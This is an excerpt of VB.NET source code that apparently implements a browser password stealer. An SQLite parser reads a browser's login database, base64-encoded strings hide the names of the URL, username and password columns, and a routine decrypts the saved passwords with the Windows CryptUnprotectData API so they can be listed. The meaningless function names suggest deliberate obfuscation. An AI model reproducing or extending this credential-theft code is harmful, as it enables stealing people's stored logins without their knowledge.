...
Public Class SQLiteHandler
    ...
    Private Sub ReadMasterTable(ByVal Offset As UInt64)
        ...
        ElseIf db_bytes(Offset) = &H5 Then 'internal node
            Dim Length As Long = ConvertToInteger(Offset + 3, 2) - 1
            Dim ent_offset As Long
...
Module SQLEdit
    Public Degoland As String
    Public Sub gssdghsss()
        ...
        Try
            ...
            If File.Exists(datapath) Then
                ...
                For i = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    host = SQLDatabase.GetValue(i, VisVerde("b3JpZ2luX3VybA=="))
                    user = SQLDatabase.GetValue(i, VisVerde("dXNlcm5hbWVfdmFsdWU="))
                    pass = adsgfe43(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, VisVerde("cGFzc3dvcmRfdmFsdWU="))))

                    If (user <> "") And (pass <> "") Then
                        With Form1.lv_data.Items.Add(host)
                            .SubItems.Add(user)
                            .SubItems.Add(pass)
                        End With
                    End If
        ...
        End Try
    End Sub
    Function adsgfe43(ByVal dfsaass() As Byte) As String
        Dim pegfjkclss, dsfgsdfsdfdsf As New DATA_BLOB
        Dim Ghandle As GCHandle = GCHandle.Alloc(dfsaass, GCHandleType.Pinned)
        pegfjkclss.pbData = Ghandle.AddrOfPinnedObject()
        pegfjkclss.cbData = dfsaass.Length
        Ghandle.Free()
        CryptUnprotectData(pegfjkclss, Nothing, Nothing, Nothing, Nothing, 0, dsfgsdfsdfdsf)
        Dim Returned() As Byte = New Byte(dsfgsdfsdfdsf.cbData) {}
        Marshal.Copy(dsfgsdfsdfdsf.pbData, Returned, 0, dsfgsdfsdfdsf.cbData)
    ...
    End Structure
    Public Function VisVerde(ByVal strng As String)
        Dim strOriginal As String
        Dim b As Byte() = Convert.FromBase64String(strng)
